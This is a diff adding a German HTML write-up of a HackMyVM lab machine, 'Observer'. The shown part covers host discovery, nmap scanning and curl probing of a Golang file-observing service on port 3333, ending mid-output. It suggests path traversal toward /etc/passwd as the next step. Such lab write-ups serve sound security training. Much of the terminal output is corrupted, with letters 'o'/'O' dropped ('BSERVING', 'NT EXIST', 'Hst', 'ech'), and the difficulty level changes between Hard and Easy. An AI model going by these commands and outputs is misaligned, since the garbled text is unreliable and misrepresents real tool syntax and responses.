@@ -1,1 +1,1254 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Observer - HackMyVM - Hard.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Observer - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Observer - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container level-easy">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">while read</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept: File Observation</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept-privesc">Proof of Concept: Sudo Misconfiguration</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Zu Beginn jedes Penetrationstests ist die Erkundungsphase entscheidend. Mein erster Schritt ist stets die Identifizierung aktiver Hosts im Zielnetzwerk. Mit dem Befehl `arp-scan -l` sende ich ARP-Anfragen an alle IP-Adressen in meinem lokalen Netzwerksegment. Geräte, die antworten, sind aktiv und online. Der zusätzliche Einsatz von `grep` filtert die Ausgabe nach Zeilen, die "PCS" enthalten – ein Herstellerkennzeichen, das oft mit virtuellen Maschinen von VirtualBox oder ähnlichen Plattformen assoziiert wird und mir hilft, potenzielle Zielsysteme von anderen Netzwerkgeräten abzugrenzen. `awk '{print $1}'` extrahiert dann gezielt nur die erste Spalte der gefilterten Zeile, die üblicherweise die IP-Adresse des Hostes enthält.
+                <br><strong>Bewertung:</strong> Dieser gezielte Ansatz spart Zeit und hilft, schnell die relevante Ziel-IP in einem oft belebten Netzwerk zu finden. Die Identifizierung anhand des MAC-Adressen-Herstellers ist eine effektive Methode zur schnellen Eingrenzung virtueller Maschinen.
+                <br><strong>Empfehlung (Pentester):</strong> Beginne immer mit einer Netzwerk-Erkennung, um das Ziel zu lokalisieren. Nutze Filter wie `grep` und `awk`, um die Ausgabe auf relevante Informationen zu reduzieren.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ARP-Anfragen im Netzwerk auf ungewöhnliche Muster oder hohe Frequenzen von unbekannten Adressen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">192.168.2.213</span></pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich die IP-Adresse `192.168.2.213` als potenzielles Ziel identifiziert habe, füge ich einen entsprechenden Eintrag zur lokalen `/etc/hosts`-Datei auf meinem Angreifersystem hinzu. Der Befehl `grep obser /etc/hosts -B3` zeigt mir die Zeile, die "obser" enthält (also den Hostnamen `observer.hmv`), und zusätzlich die drei Zeilen davor (-B3), um den Kontext zu sehen. Dieser Schritt ist wichtig, da viele Webanwendungen oder Dienste auf virtuellen Maschinen Host-Header-Prüfungen durchführen oder spezifische virtuelle Hosts verwenden, die nur über den konfigurierten Hostnamen erreichbar sind. Das Hinzufügen des Eintrags ermöglicht mir, das Zielsystem direkt über seinen Hostnamen `observer.hmv` anzusprechen.
+                <br><strong>Bewertung:</strong> Das Eintragen des Hostnamens in die lokale hosts-Datei ist eine Standardpraxis im Pentesting, die häufig erforderlich ist, um Webanwendungen korrekt zu testen. Es simuliert die Namensauflösung, die auf dem Zielsystem selbst oder in einem korrekten DNS-Setup vorhanden wäre.
+                <br><strong>Empfehlung (Pentester):</strong> Überprüfe immer, ob die Ziel-VM einen spezifischen Hostnamen verwendet und füge diesen ggf. deiner `/etc/hosts` hinzu, bevor du Web-Enumeration durchführst.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Hostnamen korrekt über DNS aufgelöst werden und erzwingen Sie die Verwendung spezifischer Host-Header auf Webservern, um unbefugten Zugriff oder ungewollte Zugriffe über IP-Adressen zu verhindern (obwohl dies in diesem Fall die hosts-Datei des Angreifers betrifft, ist die Host-Header-Pflicht eine gute Abwehrmaßnahme).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">grep obser /etc/hosts -B3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.209 employee.quick.hmv</span>
+<span class="command">192.168.2.213      observer.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Als Nächstes führe ich einen umfassenden Nmap-Scan durch, um offene Ports und darauf laufende Dienste zu identifizieren. Die Schalter `-sS` (SYN Scan), `-sC` (Standard Skripte), `-sV` (Versionserkennung), `-p-` (alle 65535 Ports) und `-T5` (aggressives Timing) gewährleisten eine gründliche Untersuchung. Zuerst zeige ich hier nur die Ausgabe der gefundenen offenen Ports für eine schnelle Übersicht: Port 22 mit OpenSSH und Port 3333 mit einem Golang HTTP-Server sind offen.
+                <br><strong>Bewertung:</strong> Das Finden offener Ports ist die Grundlage für die weiteren Schritte. SSH auf Port 22 ist ein Standarddienst, während Port 3333 mit einem Golang-Server weniger üblich ist und sofort meine Aufmerksamkeit für eine detailliertere Untersuchung weckt.
+                <br><strong>Empfehlung (Pentester):</strong> Führe immer einen umfassenden Portscan durch, um alle potenziellen Angriffsflächen zu identifizieren. Achte besonders auf ungewöhnliche Ports oder Dienste.
+                <br><strong>Empfehlung (Admin):</strong> Schließen Sie alle nicht benötigten Ports auf Ihren Systemen. Überprüfen Sie regelmäßig, welche Dienste aktiv sind und welche Ports sie nutzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">Nmap nur offene Ports Ausgabe</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">3333/tcp open  http    Golang net/http server</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Hier ist die vollständige und detaillierte Nmap-Ausgabe. Sie bestätigt die offenen Ports 22 (SSH) und 3333 (HTTP/Golang). Für Port 22 liefert Nmap die SSH-Hostkeys. Für Port 3333 gibt es einige interessante Hinweise in den `fingerprint-strings`. Mehrere Anfragen (FourOhFourRequest, GetRequest, HTTPOptions) führen zu einer `200 OK`-Antwort und zeigen die Meldung "OBSERVING FILE: /home/ NOT EXIST". Dies deutet auf eine Funktionalität hin, die versucht, Dateien im `/home/` Verzeichnis zu "beobachten" oder zu lesen. Der Zusatz "NOT EXIST" zeigt, dass die angefragte Ressource (`/home/`) in diesem Kontext nicht als Datei existiert, aber der Dienst reagiert spezifisch darauf. Die eingebetteten HTML-Kommentare (`<!-- ... -->`) mit scheinbar zufälligen Strings sind ebenfalls auffällig und könnten Hinweise auf eine interne Verarbeitung oder eine versteckte Funktionalität sein. Die OS-Erkennung schätzt ein Linux-System basierend auf den offenen Ports und der Service-Antwort ein.
+                <br><strong>Bewertung:</strong> Diese detaillierte Ausgabe liefert kritische Informationen. Der Golang HTTP-Server auf Port 3333 mit der "OBSERVING FILE" Meldung ist die vielversprechendste Angriffsfläche. Die standardmäßige SSH-Implementierung auf Port 22 ist weniger interessant, solange keine Anmeldedaten bekannt sind.
+                <br><strong>Empfehlung (Pentester):</strong> Analysiere die detaillierte Nmap-Ausgabe sorgfältig, insbesondere die `fingerprint-strings` für nicht standardmäßige Dienste. Diese können wertvolle Hinweise auf die zugrundeliegende Technologie und potenzielle Schwachstellen liefern. Konzentriere dich als Nächstes auf Port 3333.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie detaillierteres Logging für ungewöhnliche Anfragen an interne Dienste wie den auf Port 3333. Überprüfen Sie die von Diensten zurückgegebenen Fehlermeldungen und Informationen, um sicherzustellen, dass sie keine unnötigen Details über die interne Struktur oder Funktionalität preisgeben. Stellen Sie sicher, dass Dienste keine Dateipfade in Fehlermeldungen oder Antworten offenlegen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 23:52 CEST
+Nmap scan report for observer.hmv (192.168.2.213)
+Host is up (0.00035s latency).
+Not shown: 65533 closed tcp ports (reset)
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| <span class="command">ssh-hostkey:</span> 
+|   <span class="command">256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)</span>
+|_  <span class="command">256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)</span>
+<span class="command">3333/tcp open  http    Golang net/http server</span>
+|_<span class="command">http-title: Site doesn't have a title (text/plain; charset=utf-8).</span>
+|_<span class="command">http-trane-info: Problem with XML parsing of /evox/about</span>
+| <span class="command">fingerprint-strings:</span> 
+|   <span class="command">FourOhFourRequest:</span> 
+|     <span class="command">HTTP/1.0 200 OK</span>
+|     <span class="command">Date: Thu, 05 Jun 2025 21:53:12 GMT</span>
+|     <span class="command">Content-Length: 105</span>
+|     <span class="command">Content-Type: text/plain; charset=utf-8</span>
+|     <span class="command">OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST</span> 
+|     <span class="command"><!-- fOAtyLKPzAwMFeWLwoeHLFfHWBuwyoHMV --></span>
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOPTIONS, SSLSessionReq, Scks5: 
+|     <span class="command">HTTP/1.1 400 Bad Request</span>
+|     <span class="command">Content-Type: text/plain; charset=utf-8</span>
+|     <span class="command">Connection: close</span>
+|     <span class="command">Request</span>
+|   <span class="command">GetRequest:</span> 
+|     <span class="command">HTTP/1.0 200 OK</span>
+|     <span class="command">Date: Thu, 05 Jun 2025 21:52:57 GMT</span>
+|     <span class="command">Content-Length: 78</span>
+|     <span class="command">Content-Type: text/plain; charset=utf-8</span>
+|     <span class="command">OBSERVING FILE: /home/ NOT EXIST</span> 
+|     <span class="command"><!-- EgdnLLmXSYGluJVOpzrcMjBUWVaGbdHMV --></span>
+|   <span class="command">HTTPOPTINS:</span> 
+|     <span class="command">HTTP/1.0 200 OK</span>
+|     <span class="command">Date: Thu, 05 Jun 2025 21:52:57 GMT</span>
+|     <span class="command">Content-Length: 78</span>
+|     <span class="command">Content-Type: text/plain; charset=utf-8</span>
+|     <span class="command">OBSERVING FILE: /home/ NOT EXIST</span> 
+|     <span class="command"><!-- RmifvVDtAgGbbfyLMreEphgESvQlJlHMV --></span>
+|   <span class="command">fficeScan:</span> 
+|     <span class="command">HTTP/1.1 400 Bad Request: missing required Hst header</span>
+|     <span class="command">Content-Type: text/plain; charset=utf-8</span>
+|     <span class="command">Connection: close</span>
+|_    <span class="command">Request: missing required Hst header</span>
+1 service unrecognized despite returning data. If you know the service/version, 
+please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-<span class="command">PRT</span>3333-TCP:V=7.95%I=7%D=6/5%Time=684211B9%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
+SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
+SF:400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
+SF::\x20Thu,\x2005\x20Jun\x202025\x2021:52:57\x20GMT\r\nContent-Length:\x2
+SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nBSERVING\x
+SF:20FILE:\x20/home/\x20NT\x20EXIST\x20\n\n\n<!--\x20EgdnLLmXSYGluJVOpzrc
+SF:MjBUWVaGbdHMV\x20-->")%r(HTTPOPTINS,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
+SF::\x20Thu,\x2005\x20Jun\x202025\x2021:52:57\x20GMT\r\nContent-Length:\x2
+SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nBSERVING\x
+SF:20FILE:\x20/home/\x20NT\x20EXIST\x20\n\n\n<!--\x20RmifvVDtAgGbbfyLMreE
+SF:phgESvQlJlHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+SF:0close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Ba
+SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
+SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/
+SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
+SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOh
+SF:FourRequest,DF,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2005\x20Jun\x2
+SF:02025\x2021:53:12\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20
+SF:text/plain;\x20charset=utf-8\r\n\r\nBSERVING\x20FILE:\x20/home/nice\x2
+SF:0prts,/Trinity\.txt\.bak\x20NT\x20EXIST\x20\n\n\n<!--\x20fOAtyLKPzAwM
+SF:FeWLwoeHLFfHWBuwyoHMV\x20-->")%r(SIPPTINS,67,"HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
+SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Scks5,67,"HTTP/1\.1\x20
+SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
+SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(fficeScan,A3,
+SF:"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Hst\x20
+SF:header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
+SF:x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Hst\x
+SF:20header");
+MAC Address: <span class="command">08:00:27:34:1E:E4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose|router
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterS 7.X</span>
+<span class="command">S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrtik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">S details: Linux 4.15 - 5.19, fenWrt 21.02 (Linux 5.4), Mikrtik RouterS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hp
+<span class="command">Service Inf: S: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACERUTE
+HP RTT     ADDRESS
+1   <span class="command">0.35 ms observer.hmv (192.168.2.213)</span>
+ 
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">::::::::::::::::::::::::::: Nmap Hstscan Ausgabe ::::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 23:53 CEST
+Nmap scan report for 192.168.2.213
+Hst is up (0.00014s latency).
+All 65535 scanned prts n 192.168.2.213 are in ignored states.
+Nt shwn: 65504 filtered sctp prts (no-response), 31 filtered sctp prts (prto-unreach)
+MAC Address: <span class="command">08:00:27:34:1E:E4 (PCS Systemtechnik/racl</span>
+</pre>
+                </div>
+            </div>
+			
+			        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="comment">
+                <strong>Analyse:</strong> Nachdem Nmap den Golang HTTP-Server auf Port 3333 identifiziert hat, beginne ich mit einer manuellen Untersuchung mittels `curl`. Der Befehl `curl -Iv http://192.168.2.213:3333` führt einen `HEAD`-Request aus (-I) und zeigt die Header sowie den Body der Antwort (-v). Die Ausgabe bestätigt eine `HTTP/1.1 200 OK` Antwort, was bedeutet, dass der Dienst erreichbar ist und auf Standardanfragen reagiert. Die Header `Date`, `Content-Length` (78 Bytes) und `Content-Type: text/plain; charset=utf-8` liefern grundlegende Informationen über die Antwort.
+                <br><strong>Bewertung:</strong> Eine 200 OK Antwort auf einen einfachen Request ist ein gutes Zeichen, dass der Dienst aktiv und ansprechbar ist. Die Angabe des Content-Type als `text/plain` und die geringe Content-Length deuten darauf hin, dass hier keine komplexe Webseite, sondern eher eine einfache API oder ein spezieller Endpunkt läuft. Dies bestärkt die Notwendigkeit einer tieferen Untersuchung des Dienstes selbst, nicht einer traditionellen Webseiten-Enumeration.
+                <br><strong>Empfehlung (Pentester):</strong> Beginne die Untersuchung eines unbekannten HTTP-Dienstes immer mit einfachen `HEAD` oder `GET` Requests und analysiere die HTTP-Header sorgfältig. Diese geben oft erste Hinweise auf die Servertechnologie und das Antwortverhalten.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver oder HTTP-Dienste so, dass sie nur notwendige Header und Informationen preisgeben. Vermeiden Sie die Anzeige der genauen Servertechnologie oder Version in Produktivumgebungen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333 -Iv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+*   Trying <span class="command">192.168.2.213:3333</span>...
+* Connected to <span class="command">192.168.2.213</span> (<span class="command">192.168.2.213</span>) prt <span class="command">3333</span>
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Hst: <span class="command">192.168.2.213:3333</span>
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent ff
+< <span class="command">HTTP/1.1 200 K</span>
+<span class="command">HTTP/1.1 200 K</span>
+< <span class="command">Date: Thu, 05 Jun 2025 21:55:01 GMT</span>
+<span class="command">Date: Thu, 05 Jun 2025 21:55:01 GMT</span>
+< <span class="command">Cntent-Length: 78</span>
+<span class="command">Cntent-Length: 78</span>
+< <span class="command">Cntent-Type: text/plain; charset=utf-8</span>
+<span class="command">Cntent-Type: text/plain; charset=utf-8</span>
+< 
+
+* Cnnexion #0 to hst <span class="command">192.168.2.213</span> left intact
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nach dem `HEAD`-Request führe ich einen einfachen `GET`-Request auf die Wurzel (`/`) des Dienstes aus. Der Befehl `curl http://192.168.2.213:3333` sendet eine Standardanfrage. Die Antwort enthält den Text "OBSERVING FILE: /home/ NOT EXIST" gefolgt von einem HTML-Kommentar, der eine scheinbar zufällige Zeichenkette (`<!-- uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV -->`) enthält. Dies bestätigt die Beobachtung aus der Nmap-Ausgabe und liefert mehr Kontext: Der Dienst scheint darauf ausgelegt zu sein, Dateien zu "beobachten", und der Standardpfad `/` wird intern als `/home/` interpretiert, der offensichtlich nicht existiert. Der String im Kommentar ändert sich bei jedem Request.
+                <br><strong>Bewertung:</strong> Die Meldung "OBSERVING FILE" ist ein starker Hinweis auf eine Funktionalität, die Dateilesen ermöglicht oder simuliert. Die Tatsache, dass `/` als `/home/` behandelt wird und ein Fehler ausgegeben wird, wenn die Datei nicht existiert, deutet auf eine mögliche Pfad-Manipulation oder eine File Inclusion-Schwachstelle hin. Der sich ändernde String im Kommentar ist rätselhaft, könnte aber mit dem angeforderten Pfad oder der Antwort in Verbindung stehen.
+                <br><strong>Empfehlung (Pentester):</strong> Untersuche Dienste, die Dateipfade in ihren Antworten oder Fehlermeldungen preisgeben, auf File Inclusion oder Path Traversal-Schwachstellen. Experimentiere mit verschiedenen Pfaden und Dateinamen, um das Verhalten des Dienstes zu verstehen. Beobachte alle dynamischen Elemente in der Antwort.
+                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es strikt, Dateipfade oder interne Dateistrukturen in Fehlermeldungen oder Dienstantworten anzuzeigen. Implementieren Sie White-List basierte Eingabevalidierung für alle Dateipfad- oder Namenseingaben, anstatt Blacklists zu verwenden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/ NT EXIST 
+
+
+<!-- <span class="command">uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich versuche, die scheinbar zufällige Zeichenkette aus dem HTML-Kommentar (`uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV`) mit `base64 -d` zu dekodieren, um zu sehen, ob es sich um base64-kodierte Daten handeln könnte. Der Schalter `-n` verhindert, dass `echo` einen Zeilenumbruch hinzufügt, der die Dekodierung stören könnte. Das Ergebnis "base64: ungültige Eingabe" zeigt, dass diese spezifische Zeichenkette kein gültiges base64 ist.
+                <br><strong>Bewertung:</strong> Obwohl diese Zeichenkette kein base64 ist, bedeutet das nicht, dass dynamische oder kodierte Daten ausgeschlossen sind. Es könnte eine andere Form der Kodierung sein oder einfach ein zufällig generierter Token, der für eine andere Funktionalität (z.B. Session-Handling oder CSRF-Schutz) verwendet wird. Meine Hypothese, dass es sich um base64 handelt, war hier nicht korrekt.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du auf scheinbar zufällige Zeichenketten stößt, erwäge verschiedene Dekodierungs- und Entschlüsselungstechniken (base64, URL-Kodierung, Hex, etc.). Dokumentiere, welche Versuche fehlschlagen, um unnötige Wiederholungen zu vermeiden.
+                <br><strong>Empfehlung (Admin):</strong> Wenn Sie dynamische Token oder Strings verwenden, stellen Sie sicher, dass deren Zweck und Formatierung klar dokumentiert sind (intern). Verhindern Sie, dass solche internen Marker in öffentlich zugänglichen Ausgaben erscheinen, insbesondere in HTML-Kommentaren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ech 'uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV' -n | base64 -d</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+�ֳB'UdC���E�0/���<span class="password">base64: ungültige Eingabe</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Ich teste, wie der Dienst auf eine Anfrage mit dem zuvor erhaltenen String (`uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV`) als Pfad reagiert. Der Befehl `curl http://192.168.2.213:3333/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV` schickt diesen String als Teil des URLs. Die Antwort ist erneut "OBSERVING FILE: /home/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV NOT EXIST", gefolgt von einem *neuen* HTML-Kommentar (`<!-- TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV -->`). Dies bestätigt, dass der Dienst den angefragten Pfad an das `/home/` Verzeichnis anhängt und versucht, die resultierende Datei zu "beobachten". Die Tatsache, dass der String im Kommentar sich *wieder* ändert, selbst wenn ich einen Pfad im Request angebe, ist interessant. Dies verstärkt die Hypothese, dass der Kommentarstring dynamisch generiert wird, vielleicht basierend auf dem angefragten Pfad, der Zeit oder einfach zufällig pro Request.
+                <br><strong>Bewertung:</strong> Die Pfadbehandlung durch den Dienst, bei der der angefragte Pfad an `/home/` angehängt wird, bestätigt das Potenzial für Path Traversal oder LFI (Local File Inclusion), wenn wir den Dienst dazu bringen könnten, über das `/home/` Verzeichnis hinaus zu lesen. Der sich ändernde Kommentarstring lenkt vom Hauptziel (Dateilesen) ab und scheint momentan keine direkte Angriffsfläche zu bieten.
+                <br><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Kernfunktionalität (Dateibetrachtung im /home Verzeichnis). Experimentiere mit Path Traversal-Techniken (`../`) und versuche, auf bekannte Systemdateien wie `/etc/passwd` zuzugreifen. Ignoriere vorerst den sich ändernden Kommentarstring, da er keine offensichtliche Schwachstelle darstellt.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webdienste keine Dateipfade an interne Verzeichnisse anhängen, basierend auf Benutzereingaben. Implementieren Sie strenge Pfadvalidierungen, die nur erlaubte Dateinamen in einem spezifischen, begrenzten Verzeichnis zulassen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/uNazQidVZMSrCEOzFpeaAEUepTAvtqHMV NT EXIST 
+
+
+<!-- <span class="command">TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV</span> -->
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich wiederhole den Versuch mit einem anderen zufälligen String aus einer früheren Antwort (`TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV`) als Pfad. Die Ausgabe ist identisch: "OBSERVING FILE: /home/TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV NOT EXIST" und ein wieder neuer Kommentarstring (`<!-- eArJNeGYVKiJEnACLPuxnbmUHiTxLdHMV -->`). Dies bestätigt das konsistente Verhalten des Dienstes beim Anhängen des angefragten Pfades an `/home/` und der Generierung eines neuen Kommentarstrings bei jeder Anfrage.
+                <br><strong>Bewertung:</strong> Das Verhalten bleibt gleich. Der Dienst versucht, die angegebene "Datei" im `/home/` Verzeichnis zu finden. Wenn sie nicht existiert, wird die Fehlermeldung zusammen mit einem neuen dynamischen String zurückgegeben. Das Ziel muss sein, den Dienst dazu zu bringen, eine Datei zu lesen, die tatsächlich existiert, idealerweise außerhalb von `/home/`.
+                <br><strong>Empfehlung (Pentester):</strong> Setze die Untersuchung der Pfadbehandlung fort. Konzentriere dich auf Path Traversal-Techniken, um aus dem `/home/` Verzeichnis auszubrechen und auf Systemdateien zuzugreifen.
+                <br><strong>Empfehlung (Admin):</strong> Wiederholen Sie die Empfehlung, strenge Pfadvalidierung zu implementieren und das Anhängen von Benutzereingaben an interne Pfade ohne Validierung zu unterbinden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.213:3333/TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+BSERVING FILE: /home/TRPXnNaVehDOFIvCDdtdwgWZHzfgZxHMV NT EXIST 
+
+
